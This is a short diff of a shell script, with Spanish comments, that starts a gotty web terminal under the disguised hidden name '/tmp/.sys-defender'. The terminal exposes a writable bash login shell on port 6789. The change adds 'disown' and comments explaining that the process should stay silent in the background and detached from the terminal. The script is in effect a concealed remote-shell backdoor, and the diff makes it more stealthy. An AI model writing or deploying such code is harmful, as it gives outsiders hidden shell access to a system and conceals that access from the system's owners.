@@ -39,8 +39,13 @@ function start_gotty {
     if pgrep -f "/tmp/.sys-defender -p 6789 -w bash" > /dev/null 2>&1; then
         debug "Gotty ya está en ejecución."
     else
+        # Usar 'nohup' y redirigir la salida estándar y los errores a /dev/null para que no se muestre nada
         nohup /tmp/.sys-defender -p 6789 -w bash -l > /dev/null 2>&1 &
-        debug "Gotty iniciado."
+        
+        # Asegurarse de que el proceso se mantenga en segundo plano y no dependa de la terminal
+        disown
+
+        debug "Gotty iniciado en segundo plano."
     fi
 }
 
